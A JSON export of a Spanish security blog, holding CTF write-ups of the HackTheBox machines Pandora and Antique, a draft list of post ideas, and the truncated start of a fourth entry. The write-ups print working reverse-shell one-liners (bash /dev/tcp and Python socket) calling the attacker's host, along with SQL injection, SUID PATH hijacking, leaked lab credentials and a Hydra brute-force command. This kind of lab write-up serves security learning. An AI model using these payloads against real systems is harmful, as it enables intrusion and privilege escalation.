[
    {
        "title": "CTF - Pandora WriteUp",
        "slug": "ctf-pandora",
        "date": "2022-01-29",
        "tags": [
            "CTF",
            "Pentesting",
            "Hacking",
            "Pivoting",
            "Suid"
        ],
        "images": [
            "/static/images/uploads/ctf-pandora/pandora-750x410.webp",
            "/static/images/uploads/ctf-pandora/Screenshot_1.webp",
            "/static/images/uploads/ctf-pandora/Screenshot_3.webp",
            "/static/images/uploads/ctf-pandora/Screenshot_4.webp",
            "/static/images/uploads/ctf-pandora/pivoting-4.svg",
            "/static/images/uploads/ctf-pandora/Screenshot_5.webp",
            "/static/images/uploads/ctf-pandora/Screenshot_6.webp",
            "/static/images/uploads/ctf-pandora/burpsuite2.webp"
        ],
        "draft": false,
        "summary": "Este texto es un resumen de un CTF en el que se explora la máquina Pandora, que presenta vulnerabilidades como SNMP y una inyección SQL en el software PandoraFMS. Se obtiene acceso a la máquina y se escala privilegios mediante una vulnerabilidad de Path Hijacking en el archivo pandora_backup. Se consigue acceso como usuario root y se recupera la flag.",
        "content": "![](/static/images/uploads/ctf-pandora/pandora-750x410.webp)\n\nHe de decir que esta máquina aunque se encuentra entre las fáciles, me ha costado más de lo que me imaginaba y de hecho, los usuarios de la plataforma tienen otra opinión de la dificultad al respecto, como se puede ver en la imagen inferior:\n\n![](/static/images/uploads/ctf-pandora/Screenshot\\_1.webp)\n\n## 1. Reconocimiento\n\nAntes de nada, añadimos a nuestro /etc/hosts el dominio de la máquina por si estuviese sirviendo un servicio a través de algún virtual hosting.\n\n![/etc/hosts file](/static/images/uploads/ctf-pandora/Screenshot\\_3.webp)\n\nPrimero de todo, verificamos conexión con el objetivo.\n\n\n```\nping -c 1 pandora.htb -R\nPING pandora.htb (10.10.11.136) 56(124) bytes of data.\n64 bytes from pandora.htb (10.10.11.136): icmp_seq=1 ttl=63 time=43.7 ms\nRR: \t10.10.14.16 (10.10.14.16)\n\t10.10.10.2 (10.10.10.2)\n\tpandora.htb (10.10.11.136)\n\tpandora.htb (10.10.11.136)\n\t10.10.14.1 (10.10.14.1)\n\t10.10.14.16 (10.10.14.16)\n```\nSiendo el TTL~64, podemos asumir que nos encontramos ante una máquina Linux, en lugar de Windows, puesto que estas últimas suelen tener TTL~128.\n\nLanzamos un primer comando de NMAP con el fin de enumerar puertos TCP abiertos.\n\n\n```\nnmap -p- -sT --min-rate 5000 --open -vvv -n -Pn -oG allPorts pandora.htb\n# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)\nHost: 10.10.11.136 ()\tStatus: Up\nHost: 10.10.11.136 ()\tPorts: 22/open/tcp//ssh///, 80/open/tcp//http///\n# Nmap done at Mon Jan 24 18:01:26 2022 -- 1 IP address (1 host up) scanned in 50.99 seconds\n```\nVeo que el puerto 80 está abierto y trato de ver que me encuentro:\n\n![Static website](/static/images/uploads/ctf-pandora/Screenshot\\_4.webp)\n\nTras haber investigado la web y haber un poco de Fuzzing, doy con una vía muerta. Continúo examinando los puertos UDP a ver que me encuentro.\n\n\n```\nnmap -p- -sU --min-rate 5000 --open -vvv -n -Pn -oG allPortsUdp pandora.htb \n```\nEn este caso, después de haber echado un vistazo a los puertos TCP y no haber encontrado nada interesante, nos interesa mirar los puertos UDP de la máquina por si hay algo que nos pueda resultar útil. Tras haber examinado los puertos, nos encontramos con el puerto 161/UDP abierto. Tras lanzar el siguiente script obtenemos más información al respecto.\n\n\n```\nnmap -sUV -p161 -oN targetedUdp pandora.htb\nNmap scan report for pandora.htb (10.10.11.136)\nHost is up (0.043s latency).\n\nPORT    STATE SERVICE VERSION\n161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)\nService Info: Host: pandora\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Tue Jan 25 19:12:28 2022 -- 1 IP address (1 host up) scanned in 2.07 seconds\n```\nSNMP es un protocolo de gestión de red que sirve para monitorizar de forma centralizada el estado de distintos dispositivos conectados a una misma red.\n\n## 2. Análisis de vulnerabilidades\n\nCon el siguiente comando lanzamos un cliente SNMP e imprimimos el resultado en un archivo de texto que posteriormente analizaremos:\n\n\n```\nsnmpwalk -v 2c -O n -c public pandora.htb  snmp.txt\n```\nAnalizando el archivo snmp.txt y realizando una lectura diagonal de las más de 2000 líneas que contiene, me encuentro con el siguiente resultado:\n\n\n```\n.1.3.6.1.2.1.25.4.2.1.5.832 = STRING: \"-f\"\n2034   │ .1.3.6.1.2.1.25.4.2.1.5.836 = STRING: \"-f\"\n2035   │ .1.3.6.1.2.1.25.4.2.1.5.840 = STRING: \"-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'\"\n```\nHay un usuario denominado \"daniel\". Intentamos conectarnos a la máquina con las credenciales y...\n\n\n```\nssh daniel@pandora.htb\ndaniel@pandora.htb's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\nLast login: Sat Jan 29 16:40:25 2022 from 10.10.15.11\ndaniel@pandora:~$ whoami\ndaniel\ndaniel@pandora:~$ hostname -I\n10.10.11.136 \n```\nEstamos dentro. Nos anotamos las credenciales por si las volviésemos a necesitar posteriormente. Continuamos examinando el equipo. Hay otro usuario en el equipo llamado Matt y no podemos entrar en su directorio. Pero quiero saber que es ese proceso (/usr/bin/host\\_check) que requería las credenciales de dani.\n\nImprimo las cadenas de caracteres que contiene el binario y me encuentro la siguiente URL: [http://127.0.0.1/pandora\\_console/include/api.php?op=get&op2=all\\_agents&return\\_type=csv&other\\_mode=url\\_encode\\_separator\\_|&user=daniel&pass=HotelBabylon23](http://127.0.0.1/pandora_console/include/api.php?op=get&op2=all_agents&return_type=csv&other_mode=url_encode_separator_%7C&user=daniel&pass=HotelBabylon23)\n\nSi accedo desde mi máquina, no puedo ver nada. Solo tengo acceso desde el sistema de daniel. \n\n![Pivoting schema](/static/images/uploads/ctf-pandora/pivoting-4.svg)\n\n\n```\nssh -L 8080:pandora.htb:80 daniel@pandora.htb\n```\nDado que desde pandora.htb, lanzando una petición al puerto 80 soy capaz de ver la nueva máquina, con el comando de arriba realizo un túnel ssh que sincroniza mi puerto local 8080 con el puerto 80 de destino. De esta manera, soy capaz de acceder a la siguiente ventana:\n\n![Pandora FMS 742 login](/static/images/uploads/ctf-pandora/Screenshot\\_5.webp)\n\n## 3. Explotación\n\nPandoraFMS es un software de monitorización de red que coincide con lo que habíamos descubierto hasta ahora. Llegados a este punto, el siguiente paso natural es comprobar si la versión que hay instalada de pandora (PandoraFMS472) es vulnerable a algún tipo de exploit. Y sí, tras una pequeña búsqueda en Google nos podemos encontrar el siguiente link [(CVE-2021-32099)](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained).\n\nEn él, podemos ver que hay un archivo .php vulnerable a SQL Injection. El archivo en cuestión es **/include/chart\\_generator.php**, y el parámetro inyectable es **session\\_id**.\n\nTras efectuar unas pruebas a http://127.0.0.1:8080/pandora\\_console/include/chart\\_generator.php?session\\_id=1'+or+1=1 podemos confirmar que dicho parámetro es susceptible de inyecciones SQL.\n\n\n```\nSQL error\n: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' LIMIT 1' at line 1 ('SELECT * FROM tsessions_php WHERE `id_session` = '1' or 1=1' LIMIT 1') in\n/var/www/pandora/pandora_console/include/db/mysql.php\non line 114\nAccess is not granted\n```\nAdemás, el reporte de la vulnerabilidad nos alerta de la posibilidad de efectuar un bypass de autenticación si fuésemos capaces de introducir un ID de sesión válido.\n\nEs el turno de recurrir a SQLMap.\n\nTras aprovecharnos de la vulnerabilidad y de enumerar las diferentes tablas de la base de datos con sqlmap, vamos a proceder a lanzar un último comando con el fin de recuperar un identificador de sesión del usuario Matt.\n\n\n```\nsqlmap -u http://localhost:8080/pandora_console/include/chart_generator.php?session_id=1 -D pandora --sql-query=\"SELECT * FROM tsessions_php WHERE data LIKE '%mat%'\"\n```\nDe esta forma, si accedo desde mi navegador a http://localhost:8080/pandora\\_console/include/chart\\_generator.php?session\\_id=gathered\\_session\\_id y posteriormente a http://localhost:8080/pandora\\_console/index.php, me encontraré dentro del sistema.\n\n![Pandora FMS 742 index](/static/images/uploads/ctf-pandora/Screenshot\\_6.webp)\n\nLlegados a este punto, tras visitar cada uno de los menús en busca de alguna opción de continuar con el proceso, me he decantado por buscar en internet vulnerabilidades relativas a PandoraFMS de ejecución de código remoto o RCE. He encontrado un [enlace](https://www.rapid7.com/db/modules/exploit/linux/http/pandora_fms_events_exec/) donde se describe un script de Metasploit que permite hacer esto. He decidido lanzar Burpsuite para interceptar la petición que lanza el script y ver con mis propios ojos que hace el exploit. Tras incrustarle la cookie que me permite estar autenticado y ver la ubicación de donde poner el comando a ejecutar, he obtenido la primera flag básica del usuario Matt.\n\n![Burpsuite repeater](/static/images/uploads/ctf-pandora/burpsuite2.webp)\n\nPosteriormente, he utilizado de nuevo Burpsuite para recibir en mi máquina una reverse shell de Matt.\n\nEjecuto netcat en escucha en mi máquina local en el puerto 443\n\n\n```\nnc -lvp 443\n```\ny en Burpsuite preparo la petición con la IP de mi máquina, apuntando al puerto 443 donde voy a recibir la shell del usuario que está ejecutando PandoraFMS\n\n\n```\n# php -r 'system(\"bash -c \\\"bash -i & /dev/tcp/10.10.15.17/443 0&1\\\"\");'\ninclude/ajax/events&perform_evento_responses=100000&targets=php%20-r%20%27system%28%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.17%2F443%200%3E%261%5C%22%22%29%3B%27&response_id=1\n```\n## 4. Escalado de privilegios\n\nCada vez queda menos para el final. Una vez dentro, como Matt, necesito convertirme en el usuario root. Para ello, vamos a buscar ficheros con el privilegio SUID. Este privilegio lo que hace es que el que ejecute el dicho fichero, lo hará con los permisos del creador del archivo.\n\nNos vamos a la raíz y ejecutamos lo siguiente:\n\n\n```\ncd /\n\nmatt@pandora:/$ find \\-perm -4000 2/dev/null\nfind \\-perm -4000 2/dev/null\n...\n./usr/bin/pandora_backup\n\nmatt@pandora:/$ ls -l /usr/bin/pandora_backup\n-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup\n```\nHe eliminado parte del output para quedarnos con lo más importante.\n\nEl binario /usr/bin/pandora\\_backup tiene permisos de ejecución por los miembros del grupo Matt. Y recordamos que el usuario con el que tenemos acceso ahora es Matt.\n\nPero esto no es suficiente. Necesitamos saber que hace ese binario para ver si podemos inyectar algún tipo de código malicioso para que sea el usuario root quien lo ejecute. Si imprimimos los caracteres del binario con el fin de sacar algo más de información, observamos lo siguiente:\n\n\n```\nmatt@pandora:/$ cat /usr/bin/pandora_backup\nELF�@0:@8\n          @@@@h���HHmm   HH�-�=�=hp�-�=�=����DDP�td� � � \n```\nEl binario ejecuta el comando TAR desde una ruta relativa. Esto da lugar a un tipo de vulnerabilidad conocida como Path Hijacking.\n\nLos comandos que se pueden ejecutar de forma relativa es gracias a la variable de entorno PATH. Si imprimimos PATH obtenemos lo siguiente:\n\n\n```\nmatt@pandora:/var/www/pandora/pandora_console$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n```\nLinux, busca dentro de esas rutas absolutas el binario del comando que quieres ejecutar. Es decir, primero buscará TAR en /usr/local/sbin, luego en /usr/local/bin, luego en /usr/sbin y así sucesivamente.\n\nDe esta forma, lo que se puede hacer es modificar la variable PATH para tener otra ubicación absoluta, pero una que a mi me interese. En ella, almacenaré un binario denominado TAR que ejecutará una shell. Y gracias a que pandora\\_backup es un archivo con permisos SUID y su propietario es root, obtendré automáticamente una shell con permisos totales del sistema.\n\nAllá vamos. Lo primero que vamos a hacer es tener una shell más confiable. Vamos a generarle a Matt una clave pública/privada con el fin de poder conectarnos por ssh sin contraseña (recordamos que no la tenemos, hemos accedido a la shell por una shell reversa).\n\n\n```\ncd /home/matt && ssh-keygen\n```\nNos copiamos la id\\_rsa (clave privada) en nuestra máquina e id\\_rsa.pub (clave pública) la ponemos dentro del fichero authorized\\_keys de la máquina atacada.\n\nDe esta forma, podrémos crear una shell desde nuestra máquina y efectuar los siguientes comandos para efectuar la vulnerabilidad de Path Hijacking.\n\n\n```\niocio@127.0.0.1:~$ chmod 600 id_rsa && ssh -i id_rsa matt@pandora.htb\nmatt@pandora:~$ export PATH=/tmp:$PATH\nmatt@pandora:~$ echo $PATH\n/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\nmatt@pandora:~$ /usr/bin/pandora_backup \nPandoraFMS Backup Utility\nNow attempting to backup PandoraFMS client\nroot@pandora:~# whoami\nroot\n```\nY listo. Ya tenemos acceso al sistema. Recuperamos la flag y terminamos con la máquina.\n\n\n```\nroot@pandora:~# cat /root/root.txt \nXXX\n```\n"
    },
    {
        "title": "CTF - Antique WriteUp",
        "slug": "ctf-antique",
        "date": "2022-01-30",
        "tags": [
            "CTF",
            "Hacking",
            "Pentesting",
            "#Import 2022-12-20 21:06"
        ],
        "images": [
            "/static/images/uploads/ctf-antique/Screenshot_1-1.webp",
            "/static/images/uploads/ctf-antique/fases-proyecto-pentesting-768x478.webp",
            "/static/images/uploads/ctf-antique/Screenshot_2.webp",
            "/static/images/uploads/ctf-antique/Screenshot_3-1.webp"
        ],
        "draft": false,
        "summary": "En mi último post, me enfrento al reto CTF de HackTheBox llamado \"Antique\". A través de un escaneo de puertos, descubro un servicio de gestión de impresoras HP vulnerable. Aprovechando esta vulnerabilidad, consigo acceso al sistema y escalo privilegios para obtener el flag final. Este reto destaca por su simplicidad y la necesidad de investigar el funcionamiento de scripts de Metasploit.",
        "content": "![](/static/images/uploads/ctf-antique/Screenshot_1-1.webp)\n\nMe estreno con este post donde me pongo en la piel de un pentester o Hacker (que mola más) y trato de conseguir acceso a una de las máquinas de [HackTheBox](https://app.hackthebox.com/). Este tipo de pruebas se denominan Capture The Flag, que básicamente consiste en:\n\n1. Comprometer la máquina y conseguir acceso a ella.\n2. Escalar privilegios de root y obtener el flag final, que consiste en un hash (una cadena de caracteres).\n\nDe este modo, introduces el flag en la plataforma y demuestras que has conseguido el reto.\n\nEn cualquier caso, vamos al lío. Las fases de un trabajo de este tipo son las siguientes:\n\n![](/static/images/uploads/ctf-antique/fases-proyecto-pentesting-768x478.webp)\n\nSi bien es cierto que no es un trabajo totalmente lineal y que en cada uno de los momentos debes continuar enumerando dispositivos, analizando vulnerabilidades nuevas que te vas encontrando... podemos resumirlo del siguiente modo:\n\n1. Escaneo\n2. Acceso al sistema\n3. Escalado de privilegios\n\n## 1. Escaneo\n\nEste es el punto más automático de todos. En todas las máquinas tienes que seguir la misma metodología y tratar de enumerar el máximo número de puertos abiertos en la máquina que deseas atacar.\n\n\n```\n❯ nmap -p- -sT --open --min-rate 5000 -vvv -n -Pn -oG allPorts antique.htb\n```\n*donde:*\n\n* *-p- lista los puertos de [0, 65535]*\n* *-sT se centra en los de protocolo TCP*\n* *--open filtra por puertos abiertos*\n* *--min-rate 5000 fija el uso mínimo de 5000 paquetes/s para aumentar la velocidad*\n* *-vvv nos devuelve información de los puertos según los va descubriendo*\n* *-n deshabilita la resolución DNS para hacerlo más rápido*\n* *-Pn trata todos los hosts online, deshabilitando el host discovery*\n* *-oG exporta en formato grep la respuesta del comando a un archivo*\n\nEl comando nos arroja el puerto 23 abierto. Lanzamos otro comando más específico a ver si podemos sacar alguna conclusión más próxima de que tenemos delante.\n\n\n```\n❯ nmap -p23 -sCV -vvv -oN targeted antique.htb\n```\n*donde*\n\n* *-p23 especifica el puerto que se desea atacar*\n* *-sCV utiliza los scripts básicos de reconocimiento para tratar de recuperar la versión del servicio en escucha además de otra información básica*\n* *-vvv devuelve información importante*\n* *-oN exporta en formato de NMAP la respuesta del comando a un archivo*\n\nVisualizamos la respuesta y analizamos. En este caso la herramienta no ha sido capaz de recuperar que servicio está corriendo detrás del puerto, pero nos arroja cierta información que ha recuperado.\n\n\n```\nPORT   STATE SERVICE REASON         VERSION\n23/tcp open  telnet? syn-ack ttl 63\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port23-TCP:V=7.92%I=7%D=1/30%Time=61F672BE%P=x86_64-pc-linux-gnu%r(NULL\nSF:,F,\"\\nHP\\x20JetDirect\\n\\n\")%r(GenericLines,19,\"\\nHP\\x20JetDirect\\n\\nPas\nSF:sword:\\x20\")%r(tn3270,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(GetReq\nSF:uest,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(HTTPOptions,19,\"\\nHP\\x2\nSF:0JetDirect\\n\\nPassword:\\x20\")%r(RTSPRequest,19,\"\\nHP\\x20JetDirect\\n\\nPa\nSF:ssword:\\x20\")%r(RPCCheck,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(DNS\nSF:VersionBindReqTCP,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(DNSStatusR\nSF:equestTCP,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(Help,19,\"\\nHP\\x20J\nSF:etDirect\\n\\nPassword:\\x20\")%r(SSLSessionReq,19,\"\\nHP\\x20JetDirect\\n\\nPa\nSF:ssword:\\x20\")%r(TerminalServerCookie,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\nSF:\\x20\")%r(TLSSessionReq,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(Kerbe\nSF:ros,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(SMBProgNeg,19,\"\\nHP\\x20J\nSF:etDirect\\n\\nPassword:\\x20\")%r(X11Probe,19,\"\\nHP\\x20JetDirect\\n\\nPasswor\nSF:d:\\x20\")%r(FourOhFourRequest,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r\nSF:(LPDString,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(LDAPSearchReq,19,\nSF:\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(LDAPBindReq,19,\"\\nHP\\x20JetDire\nSF:ct\\n\\nPassword:\\x20\")%r(SIPOptions,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x\nSF:20\")%r(LANDesk-RC,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(TerminalSe\nSF:rver,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(NCP,19,\"\\nHP\\x20JetDire\nSF:ct\\n\\nPassword:\\x20\")%r(NotesRPC,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\nSF:\")%r(JavaRMI,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(WMSRequest,19,\"\nSF:\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(oracle-tns,19,\"\\nHP\\x20JetDirect\nSF:\\n\\nPassword:\\x20\")%r(ms-sql-s,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")\nSF:%r(afp,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(giop,19,\"\\nHP\\x20JetD\nSF:irect\\n\\nPassword:\\x20\");\n\n```\nVamos a conectarnos directamente nosotros al puerto 23 mediante telnet a ver que nos encontramos.\n\n\n```\n❯ telnet antique.htb\nTrying 10.10.11.107...\nConnected to antique.htb.\nEscape character is '^]'.\n\nHP JetDirect\n\nPassword: 1234\nInvalid password\nConnection closed by foreign host.\n```\nParece que hay un servicio de gestión de impresoras HP respondiendo, pero no desconocemos la contraseña. Navegando por internet, hayamos el siguiente [post](https://www.exploit-db.com/exploits/22319) donde explican algunos problemas con este servicio. Lanzamos el siguiente comando y tratamos de ver la respuesta.\n\n\n```\n❯ snmpwalk -v 2c -c public antique.htb .1.3.6.1.4.1.11.2.3.9.1.1.13.0\niso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 \n33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135\n```\nLa vulnerabilidad habla de una revelación de la contraseña de acceso en formato hexadecimal, por lo que vamos a empezar por copiar toda la cadena de caracteres después de \"BITS:\" y decodificarlo a un formato que podamos leer mejor.\n\n\n```\n❯ echo \"50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 \\106 111 114 115 119 122 123 126 130 131 134 135\" | xxd -r -p\n# P@ssw0rd@123!!123�q��\"2Rbs3CSs��$4�Eu�WGW�(8i\tIY�aA�\"1&1A5# \n```\nVaya, vamos a probar *P@ssw0rd@123!!123* y ver que pasa.\n\n\n```\n❯ telnet antique.htb\nTrying 10.10.11.107...\nConnected to antique.htb.\nEscape character is '^]'.\nHP JetDirect\n\nPassword: P@ssw0rd@123!!123\n\nPlease type \"?\" for HELP\n \n```\nProbando distintos datos de entrada, parece que podemos llegar a ejecutar código remotamente. Llegamos incluso a ver que el propio servicio de HP JetDirect es un script de Python por lo que podemos inferir que la máquina es capaz de ejecutar este tipo de archivos.\n\n## 2. Acceso al sistema\n\nPonemos en nuestra máquina un servicio escuchando en el puerto 443 y lanzamos desde la consola de Telnet el siguiente script\n\n\n```\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.16\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'\n```\nVolvemos a nuestra consola donde estábamos esperando la shell...\n\n\n```\n❯ nc -lvp 443\nlistening on [any] 443 ...\nconnect to [10.10.14.16] from antique.htb [10.10.11.107] 37726\nlp@antique:~$ whoami\nlp\nlp@antique:~$ hostname -I\n10.10.11.107 \nlp@antique:~$ cat user.txt\t\n7d28xxxxxxxxxxxxxxxxxxxxx\n```\nPrimera flag obtenida. Estamos dentro.\n\n## 3. Escalado de privilegios\n\nLlegados a este punto, continuamos viendo que puertos hay abiertos en el sistema.\n\n\n```\nlp@antique:~$ ss -tulpn | grep LISTEN\ntcp     LISTEN   0        4096             0.0.0.0:631           0.0.0.0:*\ntcp     LISTEN   0        128              0.0.0.0:23            0.0.0.0:* users:((\"python3\",pid=828,fd=3))\ntcp     LISTEN   0        4096                [::]:631              [::]:*\n```\nSi hacemos curl al puerto 631 desde la máquina atacada vemos una web de [CUPS](https://es.wikipedia.org/wiki/Common_Unix_Printing_System) que no es accesible desde nuestro sistema, por lo que no podemos ver nada desde nuestra máquina.\n\nPara trabajar un poco más cómodos, es necesario hacer [pivoting](https://pentestwiki.org/pivoting/). Personalmente, me gusta utilizar ssh para crear un túnel, pero en este caso no tenemos acceso por ssh ni podemos conseguirlo ejecutando un ssh-keygen al no estar instalado en el sistema atacado.\n\nExiste una herramienta denominada [Chisel](https://github.com/jpillora/chisel) que nos permite conseguir lo mismo sin necesitar permisos de root ni de nada.\n\nProcedemos a compilarla en nuestra máquina y lanzamos el servidor en modo reverse, para dejarle al cliente escoger el puerto desde el cual quiere crear el túnel.\n\n\n```\n❯ git clone https://github.com/jpillora/chisel\n❯ cd chisel && go build -ldflags=\"-s -w\"\n❯ sudo ./chisel server -p 8000 --reverse\n```\nUna vez hecho esto, procedemos a enviar el binario a la máquina atacada con el fin de poder ejecutarlo también. Levantamos un servidor en el puerto 8080 con Python.\n\n\n```\n❯ python3 -m http.server 8080\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n```\nY en el servidor remoto, nos lo descargamos con wget y le damos permisos de ejecución para conectarnos al otro extremo.\n\n\n```\nlp@antique:~$ wget 10.10.14.16:8080/chisel\n...\nchisel              100%[===================]   7.75M  5.53MB/s    in 1.4s\n2022-01-30 12:52:20 (5.53 MB/s) - ‘chisel’ saved [8130560/8130560]\nlp@antique:~$ chmod +x chisel\nlp@antique:~$ ./chisel client 10.10.14.16:8000 R:631:127.0.0.1:631\n./chisel client 10.10.14.16:8000 R:631:127.0.0.1:631\n2022/01/30 12:55:03 client: Connecting to ws://10.10.14.16:8000\n2022/01/30 12:55:03 client: Connected (Latency 43.929004ms)\n```\nAbrimos un navegador desde nuestro sistema et voilà.\n\n![](/static/images/uploads/ctf-antique/Screenshot\\_2.webp)\n\nLo siguiente que podemos hacer es buscar vulnerabilidades para la versión 1.6.1 de CUPS. Y nos encontramos ante la siguiente [vulnerabilidad](https://www.rapid7.com/db/modules/post/multi/escalate/cups_root_file_read/) y el siguiente [exploit](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read). Es un post de un script de Metasploit que en principio lo vamos a utilizar para entender que hace. Generalmente, estos scripts hacen tareas muy simples y es interesante examinarlos para aprender más aún de ellos. En este caso, la vulnerabilidad se basa en un problema dentro del módulo de administraciónver archivo de registro de error en CUPS. \n\nEste módulo imprime por pantalla la ubicación del log de error. Además, aquellos usuarios del grupo *lpadmin* son capaces de modificar dicha ubicación con el comando *cupsctl*. Comprobamos que pertenecemos a dicho grupo.\n\n\n```\nlp@antique:~$ id\nuid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)\n```\nY procedemos a modificar la ruta a la que queremos acceder con el siguiente comando.\n\n\n```\nlp@antique:~$ cupsctl ErrorLog=\"/root/root.txt\"\n```\nNos aseguramos que seguimos manteniendo el túnel de Chisel activo y vamos al navegador para revisar el módulo de error de CUPS.\n\n![](/static/images/uploads/ctf-antique/Screenshot\\_3-1.webp)\n\nAhí está el flag de root. He tenido que recargar la página asegurándome de no cachear la respuesta, ya que al principio no era capaz de ver el resultado. Con esto finalizamos la máquina.\n\n## Conclusión\n\nEsta máquina se nota que es de dificultad fácil aunque no es trivial el escalado de privilegios final si no has trabajado antes con impresoras en Linux. Ha sido necesario investigar el funcionamiento de los scripts de Metasploit para no alargar mucho la resolución de la misma y aunque finalmente solo tienes acceso a leer archivos de la máquina y no es un escalado de privilegios real, podemos darla por terminada.\n\n"
    },
    {
        "title": "Ideas de post",
        "slug": "ideas-de-post",
        "date": "2022-01-30",
        "tags": [
            "#Import 2022-12-20 21:06"
        ],
        "images": [],
        "draft": true,
        "summary": "En este blog hablo sobre diferentes temas de seguridad, como el escaneo de vulnerabilidades en contenedores, técnicas de OSINT utilizando Google dorks y recursos para obtener información de correos electrónicos. También cubro temas como fuzzing, fuerza bruta con Hydra, pivoting con SSH, reconocimiento con Nmap y monitorización de procesos. Además, exploro cómo trabajar con Burpsuite, almacenar contraseñas de forma segura en una base de datos y ejecución remota de código a través de plantillas de Jinja. También abordo el tema del envenenamiento ARP para realizar ataques de MITM.",
        "content": "* Hablar sobre trivy y escaneadores de vulnerabilidades. Por ejemplo el contenedor de python:3.11 tiene vulnerabilidades un monton pero el de alpine no.\n* trivy image --ignore-unfixed --severity HIGH python:3.11\n* trivy image --ignore-unfixed --severity HIGH python:3.11-alpine\n* Post sobre Osint, google dorks\n* https://cheatsheet.haax.fr/open-source-intelligence-osint/dorks/google_dorks/\n* https://twitter.com/TakSec/status/1609650609640312832\n* \n* Post sobre OSINT\n* https://geoxc-apps.bd.esri.com/space/satellite-explorer/ Aqui puedo hablar del proposito de los satelites, tipos de orbitas, dueños y basura espacial\n* https://satellitemap.space/?constellation=starlink&norad=50188 lo puedo incluir en el de arriba para hablar de starlinkt\n* ----\n* Webcams sin contraseña http://www.insecam.org/en/bycountry/ES/?page=8\n* https://world-webcams.nsspot.net/\n* buscar en shodan a ver si hay algun google dork para sacar passwords default\n* Emails: https://nixintel.info/osint/12-osint-resources-for-e-mail-addresses/\n* Business and personal fingerprinting: https://www.futurespace.es/fs-osint/, esta web te muestra el leak de informacion que da tu navegador cuando visitas cualquier web https://browserleaks.com/. este te hace un test de cuanto seguro es tu browser https://coveryourtracks.eff.org/\n* https://clearbit.com/customers esta antes dabas un mail y te sacaba informacion de la persona, gustos, donde esta registrado... se ve que han cambiado un poco para que de \"menos\" miedo. Este post de 2015 lo confirma https://www.softzone.es/2015/04/08/clearbit-software-detras-direccion-email/. Estas webs infieren la identidad de un mail mirando en internet, cookies,...\n\n* Post sobre fuzzing de uris\n\n\n```\nwfuzz -c --hc=404,301 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://soccer.htb/tiny/uploads/FUZZ/\n```\n* fuzzing dns fuzz.web.com\n* fuzzing  web.com/fuzz/\n* fuzzing web.com/directory/fuzz.php\n\n* Post sobre fuerza bruta con hydra\n\n\n```\nhydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/SecLists/Passwords/2020-200_most_used_passwords.txt soccer.htb http-post-form \"/tiny/:fm_usr=^USER^&fm_pwd=^PASS^:Invalid username or password\"\n```\n* \n* Pivoting con ssh, chisel\n* como funcitona tcp y https\n* Reconocimiento con nmap, script custom de python\n* Monitorizacion de procesos con ps-aux, pspy,\n* Escalado de privilegios suid\n* Reconocimiento de directorios con dirbuster, wfuzz\n* Trabajar con burpsuite para capturar peticiones y reenviarlas añadiendo una cookie de sesion\n* Pensar en cosas de docker que pueda enseñar\n* Almacenar contraseñas de forma segura en una db\n* ejecucion remota de codigo a traves de la plantilla de jinja cros side remote templtate https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection\n* Explicar arp poisoning MITM\n"
    },
    {
        "title": "SQL Injection para Dummies",
        "slug": "sql-injection-para-dummies",
        "date": "2022-01-30",
